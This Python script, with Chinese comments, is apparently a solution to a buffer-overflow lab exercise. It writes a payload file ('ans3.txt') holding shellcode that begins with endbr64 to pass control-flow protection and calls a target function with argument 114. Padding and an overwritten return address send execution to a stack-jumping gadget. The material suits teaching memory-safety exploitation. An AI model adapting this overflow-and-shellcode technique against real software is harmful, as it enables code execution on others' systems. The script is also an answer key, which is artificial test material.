import struct

# ---------------- 配置区域 ----------------
# 1. 目标函数 func1 的地址 (从你的反汇编中获得)
func1_addr = 0x401216 

# 2. 辅助 Gadget: jmp_xs 的地址
#    它的作用是计算出栈上 Buffer 的地址并跳过去
jmp_xs_addr = 0x401334 

# 3. Padding 长度
#    func 中 buffer 是 -0x20(%rbp)，所以长度是 0x20(32) + 0x8(saved_rbp) = 40
padding_len = 40
# ----------------------------------------

# 构造 Shellcode (机器码)
# 注意：由于程序开启了 fcf-protection，间接跳转的目标必须以 endbr64 开头
shellcode = b''
shellcode += b'\xf3\x0f\x1e\xfa'        # endbr64 (欺骗 CPU 说这里是合法的跳转点)
shellcode += b'\x6a\x72'                # push 0x72 (114)
shellcode += b'\x5f'                    # pop %rdi  (现在 rdi = 114)
shellcode += b'\xb8' + struct.pack('<I', func1_addr) # mov eax, 0x401216
shellcode += b'\xff\xd0'                # call %rax (调用 func1)

# 确保 Shellcode 不会超过 Buffer 大小 (32字节)
if len(shellcode) > 32:
    print("Error: Shellcode is too long!")
    exit()

# 构造 Payload
# [ Shellcode ] + [ 填充字符 ] + [ jmp_xs 地址 ]
# jmp_xs 会跳回到 Shellcode 的开头
payload = shellcode + b'A' * (padding_len - len(shellcode))
payload += struct.pack('<Q', jmp_xs_addr)

# 写入文件
filename = "ans3.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"Payload 已写入 {filename} (长度 {len(payload)} 字节)")
print("Shellcode 内容:", shellcode.hex())